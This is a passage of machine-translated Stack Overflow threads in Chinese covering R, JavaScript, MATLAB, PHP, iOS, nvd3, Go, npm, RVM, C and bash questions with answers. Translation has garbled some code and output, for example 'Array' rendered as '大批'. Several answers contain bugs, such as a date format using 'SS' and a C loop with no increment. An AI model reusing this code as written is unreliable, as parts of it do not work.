   my_data <- read.csv("data.csv", header=TRUE, sep=",") 
   average_A <- my_data[[arg1]] + my_data[[arg2]]   # "[[" evaluates args
   average_A
 }
 elbow('A3','A5')  # entered a character literals 
```

您应该意识到 my_data 的其余部分将在`elbow`调用返回后消失并被垃圾收集。我本可以向您展示如何使用您的原始表达式 following `attach()`，这在该功能中可以说是安全的，但这违反了我的宗教原则。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T23:02:03.820

可能在您上次会话期间，您的工作区中有名为 A3 或 A5 的对象（明确定义，或者您可能已经加载并`attach`编辑了数据）。该功能正在工作，因为那些对象在那里，但它实际上并没有做你认为它正在做的事情，所以在一个具有新工作区的新会话中——没有这些对象——它不起作用。您编写的函数实际上并没有对`my_data`您正在读取的数据集 () 执行任何操作；我怀疑你想要这样的东西：

```
elbow <- function(arg1, arg2) {
  my_data <- read.csv("data.csv",header=TRUE,sep=",")
  average_A <- my_data[,arg1] + my_data[,arg2]
  return(average_A) 
} 
```

调用函数时还需要使用引号，例如

```
elbow('A3','A5') 
```

# iphone - 关闭视图控制器，转到标签栏视图

> ID：14469488
> 
> 赞同：0
> 
> 时间：2013-01-22T22:47:01.440
> 
> 标签：iphone, ios, xcode, uitabbar

我在启动时有 4 页。它们都是视图控制器。我还有一个带有 4 个视图/标签栏项目的标签栏控制器。我想要 4 个视图控制器页面上的一个按钮，该按钮链接到正确的选项卡栏视图。例如，如果我在第三个视图控制器上，我想进入标签栏中的第三个视图。我试过使用

`[((UITabBarController *)(self.parentViewController))setSelectedIndex:index];`

方法。但它不起作用。

有什么建议么？

# javascript - 随机选择的javascript时如何删除字符串

> ID：14469489
> 
> 赞同：0
> 
> 时间：2013-01-22T22:47:09.490
> 
> 标签：javascript, arrays

我的代码随机选择一个字符串并用 javascript 将其写入屏幕。这可能有点令人困惑，但我想知道它是否可以做到，所以当它随机选择一个字符串并将其写入页面时，它还会从代码中删除该字符串，因此它永远不会被再次选择？这是我的代码

```
 KeywordArray = new Array(7);  
    KeywordArray[0] = "apple";  
    KeywordArray[1] = "pear";  
    KeywordArray[2] = "orange";  
    KeywordArray[3] = "banana";  
    KeywordArray[4] = "stawberry"; 
    randno = Math.floor ( Math.random() * KeywordArray.length ); 
```

然后在我的html页面的底部我有

```
 <script>document.write(KeywordArray[randno]);</script> 
```

我想知道它是否有可能做到，所以当苹果被随机选择并放在屏幕上时，它会从数组中删除它，所以没有人能得到苹果这个词？对不起，如果这令人困惑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:50:41.527

我怀疑您想在服务器端存储一些信息，但 javascript 是客户端，所以它不是最佳选择。如果您的服务器支持，请尝试使用 PHP。此致

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:57:49.513

您可以使用[拼接](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/splice)。

```
document.write(KeywordArray.splice(randno,1)); 
```

**笔记**

如果即使页面重新加载，您也想存储已经使用的内容，您可以使用 localStorage。这将保存已经显示的元素。（但是它将显示给其他人，为了防止这种情况，您可能需要使用一些服务器端代码，例如 PHP）

那么你将需要使用

```
localStorage.setItem("used"+randno, "true"); 
```

并检查是否`localStorage.setItem("used"+randno) == "true"`，如果是这样，您将需要制作一个其他随机数（使用 while 循环）。

请放心，您将使用 enoug elments，因为如果您的所有 elments 都已显示，您将陷入无限循环

您还必须注意，某些浏览器不支持 localstorage。如果您想了解更多信息，我建议您阅读上面的[规范](http://dev.w3.org/html5/webstorage/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:51:53.763

```
var index = KeywordArray.indexOf("apple");
KeywordArray.splice(index, 1); 
```

但当然，上述工作在客户端。

# matlab - 形成矩阵时出错，MATLAB

> ID：14469493
> 
> 赞同：1
> 
> 时间：2013-01-22T22:47:34.770
> 
> 标签：matlab, matrix

我试图`a`通过`b`. 但是，下面的代码出现错误。错误发生在线

```
NV(b,:)=(a;b); 
```

错误是：

> "," 处的语法无效或缺少 )、]
> 并在 ")" 处解析错误

这是代码：

```
n=2;
g1= 1:1:10;
g=10.^(g1/10); %SNR

for a= 0:g %diff SNR
for b= 1:n %DIFF USERS
    NV(b,:)=(a;b); % NOISE VAR, MATRIX FOR DIFF SNR AND DIFF USERS.
end
 end 
```

什么可能导致这些错误，我该如何解决？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:05:34.820

在您尝试访问第二个矩阵维度的所有元素之前，未定义 NV。这本质上是在说“设置所有未知量”——它可能是一个，也可能是无穷大。这不是一个格式良好的陈述。

该行的其余部分也有点奇怪，并且语法无效，因为看起来您正在尝试创建一个数组数组。

我不确定你在做什么（NV 的第二维应该有多大以及我对“NV(b,:)=[a;b];”的更正是否是你想要的） ，但是这种语法可以编译/运行，并希望让您朝着正确的方向开始。

```
n=2;
g1= 1:1:10;
g=10.^(g1/10); %SNR

NV = zeros(n,n); % Create an empty n-by-n matrix
                 % Note: Defining the final matrix size outside of a loop
                 %       also improves performance

for a= 0:g %diff SNR
    for b= 1:n %DIFF USERS
        NV(b,:)=[a;b]; % NOISE VAR, MATRIX FOR DIFF SNR AND DIFF USERS.
    end
end 
```

# php - 更改数组的顺序以匹配一天中的小时数

> ID：14469494
> 
> 赞同：0
> 
> 时间：2013-01-22T22:47:42.053
> 
> 标签：php, arrays

我有一个数组，其中列出了一天中的所有时间，0-23 如下所示：

```
[0] = 0  [1] = 1 [2] = 2 .... etc 
```

然后我使用 date('G') 来查找当前小时，例如 17。

我想要做的是重新排序我的数组，以便它从下一个小时开始，18，然后是 19、20、21、22、23、0、1、2.. 等

做这个的最好方式是什么？我将这个数组提供给一个图表，该图表显示了一段时间内的数据，并且按照这个顺序排列确实会让事情变得更容易。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:56:24.420

这应该有效：

```
$array = array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23);

for($i = 0; $i < date("G"); $i++)
    array_push($array, array_shift($array));

print_r($array); 
```

假设`date("G")`是 14，结果将是：

```
大批
(
    [0] => 14
    [1] => 15
    [2] => 16
    [3] => 17
    [4] => 18
    [5] => 19
    [6] => 20
    [7] => 21
    [8] => 22
    [9] => 23
    [10] => 0
    [11] => 1
    [12] => 2
    [13] => 3
    [14] => 4
    [15] => 5
    [16] => 6
    [17] => 7
    [18] => 8
    [19] => 9
    [20] => 10
    [21] => 11
    [22] => 12
    [23] => 13
)
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:02:38.723

```
function rearrangeHours(&$hours, $hour_key){
  $beforeNow = array_slice($hours,0,$hour_key+1);
  $afterNow = array_slice($hours,$hour_key+1);
  return $hours = array_merge($afterNow, $beforeNow);
} 
```

然后你可以做

```
$hours = range(0,23);
rearrangeHours($hours, 15); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-22T23:46:58.037

`InfiniteIterator`我用and找到了一个很好的解决方案`LimitIterator`。您不需要更改数组。您可以直接使用迭代器。

```
$array = range(0, 23);

$start = date("G") + 1;
$count = 24;

$infinate = new InfiniteIterator(new ArrayIterator($array));
$limit = new LimitIterator($infinate, $start, $count); 
```

然后你可以`$limit`像数组一样使用。

```
foreach ($limit as $value) {
    print($value . PHP_EOL);
} 
```

# ios - AV Foundation 错误地报告玩家项目持续时间

> ID：14469496
> 
> 赞同：0
> 
> 时间：2013-01-22T22:47:46.493
> 
> 标签：ios, avfoundation, http-live-streaming, zencoder

我正在尝试使用用 zencoder 编码的 AVPlayer 在 iOS 上播放视频。我看到的问题是播放器项目报告的持续时间是四舍五入/不精确的。例如，视频时长可能是 173.134，播放器项目会将其报告为平面 174.0。这会导致检测加载百分比和其他相关内容出现问题。如果我尝试在不编码的情况下使用视频，则会正确准确地报告所有内容。

有没有其他人见过这个或有解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-22T15:10:30.927

问题原来是源视频/zencoder 的问题。音轨的长度与视频的长度略有不同，这会导致编码出现问题。切断视频的最后一秒，以便轨道持续时间匹配解决了这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-21T11:35:45.277

我有同样的问题。我只是比较当前位置和项目持续时间和 1 秒之间的差异：

```
- (void)playing:(CMTime)time
{
   CMTime itemDuration = _player.currentItem.asset.duration;
   NSTimeInterval currentTime = CMTimeGetSeconds(time);
   NSTimeInterval duration = CMTimeGetSeconds(itemDuration);
   if (fabs(currentTime - duration) < 1)
      // This is the end.
} 
```

# javascript - 如何删除 nvd3.js 中的背景网格线？

> ID：14469499
> 
> 赞同：17
> 
> 时间：2013-01-22T22:48:09.203
> 
> 标签：javascript, d3.js, nvd3.js

我正在 nvd3.js 中制作条形图，类似于以下示例：[http](http://nvd3.org/ghpages/discreteBar.html) ://nvd3.org/ghpages/discreteBar.html 。我想知道是否有办法删除网格线，这样背景就会变成纯白色。所有示例都使用网格线。我还检查了源代码，并没有在discreteBar 模型中看到任何使这成为可能的东西。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-12-13T19:35:20.040

```
.tick {
  opacity: 0;
} 
```

不适用于离散条形图中的垂直线，因为它们使用内联 css 将不透明度设置为 1。但这有效：

```
.tick {
  display: none;
} 
```

这也将隐藏轴上的标签。如果要删除行但保留标签，请使用：

```
.tick line {
  display: none;
} 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-01-22T23:41:02.777

您可以在 CSS 中选择这些网格线并将其不透明度设置为 0：

```
.tick {
  opacity: 0;
} 
```

如果您仍想查看基线，可以将其修改为：

```
.tick:not(.zero) {
  opacity: 0;
} 
```

使用浏览器的检查器工具查看您想要修改的各个元素的类，并使用 CSS 的强大功能。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-17T23:28:50.643

我[找到](https://github.com/novus/nvd3/issues/59)了一个效果更好的更具体的解决方案：

（这会删除所有网格，但您可以有选择性，即：.y1.axis）

```
.nvd3.multiChart .axis .nv-axis line {
stroke: none;
fill: none;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-04-23T17:36:10.547

摆脱准则并保持标签使用

```
.tick line {
  opacity: 0;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-07-01T11:01:06.963

只需要更新css

```
.tick line {
display: none;
} 
```

# simple.data - Simple.Data 与 InMemoryAdapter 不同

> ID：14469501
> 
> 赞同：1
> 
> 时间：2013-01-22T22:48:30.953
> 
> 标签：simple.data

我正在使用 Simple.Data 及其 InMemoryAdapter 编写一些测试。下面的代码来自我的一项测试。测试应该返回 1 个值“Atlanta”，但是我得到了 Atlanta 两次。我想知道我是否错误地使用了 Distinct 的 InMemoryAdapter？

```
var adapter = new InMemoryAdapter();
Database.UseMockAdapter(adapter);

var db = Database.Open();
db.ParentRegionList.Insert(Id: 1, RegionName: "Dublin");
db.ParentRegionList.Insert(Id: 2, RegionName: "Atlanta");
db.ParentRegionList.Insert(Id: 3, RegionName: "Atlanta");
db.ParentRegionList.Insert(Id: 4, RegionName: "Killarney");
db.ParentRegionList.Insert(Id: 5, RegionName: "Bournemouth");

var result = db.ParentRegionList.All()
    .Where(db.ParentRegionList.RegionName.Like("At%"))
    .Distinct()
    .Select(db.ParentRegionList.RegionName).Take(10)
    .ToScalarList<string>(); 
```

我也试过：

```
var result = db.ParentRegionList.All()
    .Where(db.ParentRegionList.RegionName.Like("At%"))
    .Select(db.ParentRegionList.RegionName.Distinct()).Take(10)
    .ToScalarList<string>(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-17T12:53:42.067

我认为第二种格式是正确的，我有类似的问题。而不是使用强制转换作为
`ToScalarList<string>()`尝试创建一个虚拟类型，例如。"Region" 具有名称为 RegionName 的字符串属性并转换为：`ToList<Region>()`

# ios - 无法将此 dateString 解析为 NSDate

> ID：14469503
> 
> 赞同：-2
> 
> 时间：2013-01-22T22:48:37.950
> 
> 标签：ios, objective-c

我正在尝试解析

```
2013-01-23T22:46:29.564Z 
```

进入 NSDate ：

```
NSDate *date = [GeneralHelper getDateFromDateString:expiryDateASStr];
if(date != nil) {
    printf("\n PARSED DATE %s", [date.description UTF8String]);
} else {
    printf("\n failed to parse");
} 
```

但它失败了，我怎样才能让它工作？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:24:16.410

就像@Gabriele 说的那样，使用 a`NSDateFormatter`是要走的路。以下内容对您有用，包括日期格式：

```
NSDateFormatter* df = [[NSDateFormatter alloc] init];
[df setLocale:[NSLocale currentLocale]];
[df setCalendar:[NSCalendar currentCalendar]];
[df setTimeZone:[NSTimeZone defaultTimeZone]];
[df setDateFormat:@"yyyy-MM-dd'T'HH:mm:SS.SSS'Z'"];
NSLog(@"%@", [df dateFromString:expiryDateASStr]); 
```

不要使用大写字母 Ys “YYYY”，除非您希望在基于“一年中的一周”的日历中显示年份。大多数用例“yyyy”是指定年份的正确方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T23:02:52.970

用一个`NSDateFormatter`

```
NSString * dateString = @"2013-01-23T22:46:29.564Z";
NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
[dateFormatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:SS.SSS'Z'"];
NSDate * date = [dateFormatter dateFromString:dateString]; 
```

# forms - VBA：格式化所有表单的文本框

> ID：14469507
> 
> 赞同：0
> 
> 时间：2013-01-22T22:48:55.613
> 
> 标签：forms, vba

我曾经在我的一个项目中使用一个模块来格式化excel工作簿中所有用户表单的文本框，代码看起来像：

```
Sub TxtBx(i As Integer)
    Dim uf As UserForm
        For Each uf In UserForms
            With uf("TextBox" & i)
                If .Text Like "" Then
                ...................................... 
```

现在我将我的项目移动到一个应用程序，我需要相同的模块进行格式化。那么在 Windows 窗体应用程序中怎么说：

```
Module Module1
        Sub TxtBx(i As Integer)
            Dim f As  System.Windows.Forms.Form
            For Each f As System.Windows.Forms            
                With f("TextBox" & i)
                ..................... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-17T23:37:19.637

我无法使用.Net。我将它切换到 VB6，它看起来像：

```
Sub TxtBx(i As Integer)
    s.Language = "VBScript"
    For Each uf In Forms
        With uf("TextBox" & i)
            If .Text Like "" Or .Text Like "-" 
.................. 
```

# go - 从文件读取时如何找到EOF

> ID：14469511
> 
> 赞同：22
> 
> 时间：2013-01-22T22:49:14.893
> 
> 标签：go, file-handling

我正在使用以下代码在 Go 中读取文件：

```
spoon , err := ioutil.ReadFile(os.Args[1])
if err!=nil {
        panic ("File reading error")
} 
```

现在我检查我选择的每个字节是什么字符。例如：

```
spoon[i]==' ' //for checking space 
```

同样，我阅读了整个文件（我知道可能还有其他阅读方式）但保持这种方式完整，我怎么知道我已经达到了文件的 EOF 并且我应该停止进一步阅读它？

请不要建议查找长度`spoon`并开始循环。我想要找到EOF的可靠方法。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-01-22T23:44:12.750

用于`io.EOF`测试文件结束。例如，要计算文件中的空格：

```
package main

import (
    "fmt"
    "io"
    "os"
)

func main() {
    if len(os.Args) <= 1 {
        fmt.Println("Missing file name argument")
        return
    }
    f, err := os.Open(os.Args[1])
    if err != nil {
        fmt.Println(err)
        return
    }
    defer f.Close()
    data := make([]byte, 100)
    spaces := 0
    for {
        data = data[:cap(data)]
        n, err := f.Read(data)
        if err != nil {
            if err == io.EOF {
                break
            }
            fmt.Println(err)
            return
        }
        data = data[:n]
        for _, b := range data {
            if b == ' ' {
                spaces++
            }
        }
    }
    fmt.Println(spaces)
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-01-22T22:57:02.153

`ioutil.ReadFile()`将文件的全部内容读入字节片。你不需要关心EOF。EOF 是一种结构，当您一次读取一个文件时需要它。当您一次读取一个块时，您需要知道哪个块已到达文件末尾。

返回的字节片的长度`ioutil.ReadFile()`就是您所需要的。

```
data := ioutil.ReadFile(os.Args[1])

// Do we need to know the data size?
slice_size := len(data)

// Do we need to look at each byte?
for _,byte := range data {
    // do something with each byte
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2021-03-05T08:33:10.730

这是您需要查找的有关文件结尾（EOF）的信息

```
if err != nil {
        if errors.Is(err, io.EOF) { // prefered way by GoLang doc
            fmt.Println("Reading file finished...")
        }
        break
    } 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-01-23T13:30:38.047

当您使用 时`ioutil.ReadFile()`，您永远不会看到 io.EOF，因为 ReadFile 将读取整个文件，直到达到 EOF。所以它返回的切片**是**整个文件。从文档：

> ReadFile 读取由 filename 命名的文件并返回内容。成功的调用返回 err == nil，而不是 err == EOF。因为 ReadFile 读取整个文件，所以它不会将 Read 中的 EOF 视为要报告的错误。

从您的问题中，您明确提到您知道还有其他方法可以读取文件，其中一些方法要求您测试 io.EOF 的错误，而不是 ReadFile。

然后，使用您拥有的切片，您可以使用 for...range 构造读取文件，正如其他人提到的那样。这是读取整个文件的*可靠*方法，仅此而已（再次，ReadFile 负责）。或者从 0 迭代到 len(spoon) - 1 也可以，但是 range 更惯用，基本上也是一样的。

换句话说：**当您到达切片的末尾时，您就到达了文件的末尾**（前提是 ReadFile 没有返回错误）。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-01-22T22:56:10.470

切片没有文件结尾的概念。返回的切片`ioutil.ReadFile`具有特定的长度，它反映了读取它的文件的大小。一个常见的习惯用法，但只是在这种情况下使用的一种可能，是对切片进行范围，有效地“消耗”最初位于文件中的所有字节：

```
for i, b := range spoon {
        // At index 'i' is byte 'b'
        // At file's offset 'i', 'b' was read
        ... do something useful here
} 
```

# node.js - 如何将 npm install 安装到指定目录？

> ID：14469515
> 
> 赞同：309
> 
> 时间：2013-01-22T22:49:30.617
> 
> 标签：node.js, npm

运行时是否可以指定目标目录`npm install <package>`？

* * *

## 回答 #1

> 赞同：399
> 
> 时间：2013-01-22T22:49:30.617

您可以使用以下`--prefix`选项：

```
mkdir -p ./install/here/node_modules
npm install --prefix ./install/here <package> 
```

然后软件包将安装在`./install/here/node_modules`. 这是必需的，因为 npm 可能会选择层次结构中更高层`mkdir`的现有目录。`node_modules`（请参阅有关[文件夹的 npm 文档](https://docs.npmjs.com/files/folders#more-information)。）

* * *

## 回答 #2

> 赞同：67
> 
> 时间：2017-04-30T08:07:40.113

从 npm 版本 3.8.6 开始，您可以使用

```
npm install --prefix ./install/here <package> 
```

安装到指定目录。`node_modules`即使`node_modules`目录已经存在于更高层次结构中，NPM 也会自动创建文件夹。您还可以`package.json`在当前目录中有一个，然后使用`--prefix`选项将其安装在指定的目录中：

```
npm install --prefix ./install/here 
```

从 npm 6.0.0 开始，您可以使用

```
npm install --prefix ./install/here ./ 
```

将当前目录中的 package.json 安装到“./install/here”目录。我在 Mac 上注意到一件事，它在 node_modules 目录中创建了一个指向父文件夹的符号链接。但是，它仍然有效。

注意：NPM 尊重您通过`--prefix`选项指定的路径。[它根据有关文件夹的 npm 文档进行](https://docs.npmjs.com/files/folders#more-information)解析，仅在`npm install`没有`--prefix`选项的情况下使用。

* * *

## 回答 #3

> 赞同：55
> 
> 时间：2015-10-01T08:56:57.220

在[文档](https://docs.npmjs.com/files/folders#tl-dr)中说明：将前缀选项**与全局选项一起使用**：

> **前缀**配置默认为安装节点的位置。在大多数系统上，这是**/usr/local**。在 Windows 上，这是 node.exe 二进制文件的确切位置。在 Unix 系统上，它是上一级的，因为 node 通常安装在**{prefix}/bin/node**而不是 **{prefix}/node.exe**。
> 
> 设置**全局**标志后，npm 会将内容安装到此前缀中。如果未设置，则使用当前包的根目录，如果不在包中，则使用当前工作目录。

（他们强调）

所以在你的根目录中你可以安装

```
npm install --prefix <path/to/prefix_folder> -g 
```

它会将`node_modules`文件夹安装到文件夹中

```
<path/to/prefix_folder>/lib/node_modules 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-12-11T18:18:02.543

我正在使用 powershell 构建，并且在不更改当前目录的情况下无法运行 npm。

最终使用 start 命令并仅指定工作目录：

```
start "npm" -ArgumentList "install --warn" -wo $buildFolder 
```

# ruby-on-rails - 为什么每次打开新终端都必须安装 Rails？

> ID：14469517
> 
> 赞同：1
> 
> 时间：2013-01-22T22:49:38.683
> 
> 标签：ruby-on-rails, ruby, ubuntu, rubygems, terminal

我在使用 Ruby On Rails 时遇到问题。每次我打开一个新终端并输入 Rails 命令时，我都会收到此错误：

```
rails --version
Sorry, command-not-found has crashed! Please file a bug report at:
https://bugs.launchpad.net/command-not-found/+filebug
Please include the following information with the report:

command-not-found version: 0.3
Python version: 3.2.3 final 0
Distributor ID: Ubuntu
Description:    Ubuntu 12.10
Release:    12.10
Codename:   quantal
Exception information:

unsupported locale setting
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/CommandNotFound/util.py", line 24, in crash_guard
    callback()
  File "/usr/lib/command-not-found", line 69, in main
    enable_i18n()
  File "/usr/lib/command-not-found", line 40, in enable_i18n
    locale.setlocale(locale.LC_ALL, '')
  File "/usr/lib/python3.2/locale.py", line 541, in setlocale
    return _setlocale(category, locale)
locale.Error: unsupported locale setting 
```

我可以避免这个问题的唯一方法是重新安装 Ruby 和 Rails，我有点厌倦了这样做，因为每次打开新终端时我都必须这样做。

我尝试使用以下命令进行完全卸载：

```
rvm implode 
```

但没有成功。

我也尝试了这些命令，但仍然没有成功：

```
rvm --default use 1.9.2 (or whatever you want your default ruby interpreter to be)
rvm gemset create rails-3.0.3
rvm use 1.9.2@rails-3.0.3 --default
gem install rails 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:38:32.620

可能您只需要将 RVM 添加到 PATH 即可编写脚本。

将以下行添加到您的 ~/.bashrc 文件中。

```
PATH=$PATH:$HOME/bin/sublime_text/:$HOME/bin/cad_cuda/:$HOME/.rvm/bin
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:54:11.897

看起来您正在尝试使用 rvm - 检查安装文档并确保将代码添加到启动新外壳时设置 RVM 的外壳启动过程。

[https://rvm.io/rvm/install/](https://rvm.io/rvm/install/)

查找“2\. 将 RVM 作为函数加载到您的 shell 会话中”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:59:28.987

当我在我的 Ubuntu 机器上安装 rails 时，我使用了这个分步指南。[http://coding.smashingmagazine.com/2011/06/21/set-up-an-ubuntu-local-development-machine-for-ruby-on-rails/](http://coding.smashingmagazine.com/2011/06/21/set-up-an-ubuntu-local-development-machine-for-ruby-on-rails/)

我无法想象是什么导致了您的问题，但我自己也遇到了一些问题，因为一些依赖项带有错误的版本。进行完整更新可能会有所帮助。

# c - sscanf() 如何查看字符串中的数字？

> ID：14469519
> 
> 赞同：2
> 
> 时间：2013-01-22T22:49:42.967
> 
> 标签：c, scanf

我在以下代码中遇到了 sscanf() 的问题：

```
void num_check(const char*ps){
char *ps1=NULL;
int number=0;
unsigned sum_num=0;
ps1=ps;

for(;*ps1!='\0';ps1++){
    if (isdigit(*ps1)){
      sscanf(ps1,"%d",&number);
      sum_num+=number;
    }
    }
printf("Sum of digits is: %d",sum_num);

}

int main(){

printf("Enter a string:\n");
char str[20];
gets(str);
num_check(str);
return 0;
} 
```

问题是：当我以“w2b4e”的形式输入一个字符串时，它对我的​​数字求和，我得到了想要的结果。但是当我尝试输入诸如“w23b4e”之类的字符串时，它所做的是：它在循环中看到数字 23，所以 variable`number=23`和 s `um_num=23`，但循环中的下一步是：`number=3`和`sum_num=26`。在下一步中`sum_num= 30`......这让我很困惑。既然我不相信 sscanf() 有这么古怪的缺陷，我做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T22:52:21.590

你总是在循环中前进一个字符：`ps1++`. 您可能想要前进`ps1`到第一位数字。

更好的是，有一个名为`strtol`. 它尝试从字符串中解析整数，并可以返回第一个无法读取的字符的位置。因此，您可以`strtol`在循环中使用来对字符串中看起来像数字的所有内容求和。

* * *

如果您想对数字求和而不是在字符串中找到数字，则更容易：

```
while (*p) {
    if (isdigit(*p))
        sum_num += *p - '0';
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T22:53:51.967

如果要对数字求和（而不是整数），请改用以下命令：

```
if( isdigit(*ps1)) {
  sum_num += *ps1 - '0';
} 
```

您也可以使用`sscanf("%1d", ps1)`使其仅读取一个字符。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:53:34.060

```
for(;*ps1!='\0';ps1++){
if (isdigit(*ps1)){
  sscanf(ps1,"%d",&number);
  sum_num+=number;
}
} 
```

您一次将 ps1 增加一个字符，与读取的数字数量无关。不幸的是，您不能将 sscanf 用于此任务，因为您无法知道已读取了多少个字符。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:54:54.657

sscanf 像它应该的那样工作，它不会移动指针的开头，而是在 for 循环中将它移动一个字符。

# parsing - 使用 shell 脚本解析 csv 行中的名称值对

> ID：14469520
> 
> 赞同：2
> 
> 时间：2013-01-22T22:49:54.907
> 
> 标签：parsing, shell, csv, sed, awk

我的输入如下两行：

```
TASK1,6,INITIAL,2013-01-15 19:20:40,PREPARING,2013-01-15 19:21:12,SCHEDULED,2013-01-15 19:21:13,TRANSLATING,2013-01-15 19:21:13,LOADING,2013-01-15 19:36:37,COMPLETE,2013-01-15 19:36:42
TASK2,5,INITIAL,2013-01-15 19:20:44,PREPARING,2013-01-15 19:21:13,SCHEDULED,2013-01-15 19:21:14,TRANSLATING,2013-01-15 19:36:37,TERMINAL,2013-01-15 20:28:10 
```

我需要用这些行遍历一个文件，并为每一行计算几个时间差......我在计算等方面很好，但我有一段时间试图弄清楚如何解析这个“可变长度”字符串的名称值对...

基本上，任务# 之后的 # 是“状态”的计数，然后是这些状态及其发生时间。

我想做的是获得其中一条线，并最终得到类似这样的东西，并将值分配给它们各自的变量。（以第一行为例）：

```
$TASK_ID=TASK1
$STATUS_COUNT=6
$INITIAL=2013-01-15 19:20:40
$PREPARING=2013-01-15 19:21:12
$SCHEDULED=2013-01-15 19:21:12
$TRANSLATING=2013-01-15 19:21:13
$LOADING=2013-01-15 19:36:37
$COMPLETE=2013-01-15 19:36:42
$TERMINAL=<NULL> 
```

使问题更加复杂的是，如果多次提交任务，它只会将下一轮状态附加到第一组，这意味着我最终可能会得到如下输入行：

```
TASK1,11,INITIAL,2013-01-15 19:20:40,PREPARING,2013-01-15 19:21:12,SCHEDULED,2013-01-15 19:21:13,TRANSLATING,2013-01-15 19:21:13,LOADING,2013-01-15 19:36:37,COMPLETE,2013-01-15 19:36:42,INITIAL,2013-01-15 20:20:40,PREPARING,2013-01-15 20:21:12,SCHEDULED,2013-01-15 20:21:13,TRANSLATING,2013-01-15 20:21:13,TERMINAL,2013-01-15 20:36:42 
```

在这种情况下，我希望我的输出是：

```
$TASK_ID=TASK1
$STATUS_COUNT=11
$INITIAL=2013-01-15 20:20:40
$PREPARING=2013-01-15 20:21:12
$SCHEDULED=2013-01-15 20:21:12
$TRANSLATING=2013-01-15 20:21:13
$LOADING=<NULL>
$COMPLETE=<NULL>
$TERMINAL=2013-01-15 20:36:42 
```

我对此很困惑，有人可以帮忙吗？

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:08:08.683

```
#!/bin/bash

# Splitting on commas, read the task ID and status count followed by all of the statuses,
# which we'll parse later.
while IFS=, read -r TASK_ID STATUS_COUNT STATUSES; do
(
    # Subtly, but importantly, we put the loop body inside parentheses so each loop
    # iteration runs in a sub-shell. This ensures that the $LOADING, $COMPLETE, etc.
    # variables we set don't leak into future iterations.

    echo "TASK_ID      = $TASK_ID"
    echo "STATUS_COUNT = $STATUS_COUNT"

    # Convert the comma-separated string $STATUSES into an array using `read -a'.
    IFS=, read -ra STATUSES <<< "$STATUSES"

    # Assign the statuses to named variables. A side benefit of this is that only the
    # last value of each status type is used.
    for ((i = 0; i < ${#STATUSES[@]}; i += 2)); do
        declare "${STATUSES[$i]}=${STATUSES[$((i+1))]}"
    done

    # Print each of the statuses, or <NULL> if that stage wasn't listed.
    echo "INITIAL      = ${INITIAL:-<NULL>}"
    echo "PREPARING    = ${PREPARING:-<NULL>}"
    echo "SCHEDULED    = ${SCHEDULED:-<NULL>}"
    echo "TRANSLATING  = ${TRANSLATING:-<NULL>}"
    echo "LOADING      = ${LOADING:-<NULL>}"
    echo "COMPLETE     = ${COMPLETE:-<NULL>}"
    echo "TERMINAL     = ${TERMINAL:-<NULL>}"

    echo
)
done 
```

输出：

```
$ ./tasks < tasks.txt
TASK_ID      = TASK1
STATUS_COUNT = 6
INITIAL      = 2013-01-15 19:20:40
PREPARING    = 2013-01-15 19:21:12
SCHEDULED    = 2013-01-15 19:21:13
TRANSLATING  = 2013-01-15 19:21:13
LOADING      = 2013-01-15 19:36:37
COMPLETE     = 2013-01-15 19:36:42
TERMINAL     = <NULL>

TASK_ID      = TASK2
STATUS_COUNT = 5
INITIAL      = 2013-01-15 19:20:44
PREPARING    = 2013-01-15 19:21:13
SCHEDULED    = 2013-01-15 19:21:14
TRANSLATING  = 2013-01-15 19:36:37
LOADING      = <NULL>
COMPLETE     = <NULL>
TERMINAL     = 2013-01-15 20:28:10

TASK_ID      = TASK1
STATUS_COUNT = 11
INITIAL      = 2013-01-15 20:20:40
PREPARING    = 2013-01-15 20:21:12
SCHEDULED    = 2013-01-15 20:21:13
TRANSLATING  = 2013-01-15 20:21:13
LOADING      = 2013-01-15 19:36:37
